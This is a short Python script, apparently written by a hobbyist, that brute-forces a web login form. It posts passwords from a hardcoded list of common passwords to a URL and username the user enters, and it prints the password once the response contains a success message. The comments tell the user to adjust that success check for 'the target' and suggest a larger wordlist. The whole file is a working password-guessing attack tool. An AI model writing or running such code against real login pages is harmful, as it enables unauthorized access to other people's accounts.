import requests

def brute_force_login(url, username, password_list):
    for password in password_list:
        response = requests.post(url, data={'username': username, 'password': password})
        if "Login successful" in response.text:  # Make sure you adjust this for the target's success message!
            print(f"Login successful! Username: {username}, Password: {password}")
            break
        else:
            print(f"Attempt failed with password: {password}")

url = input("Hey! Enter the login URL please: ")
username = input("Enter the username: ")
password_list = ["password123", "admin123", "123456", "qwerty"]  # You can use a larger wordlist, but I need to figure out how to allow adding a file, as a list like this is crazy.

brute_force_login(url, username, password_list)
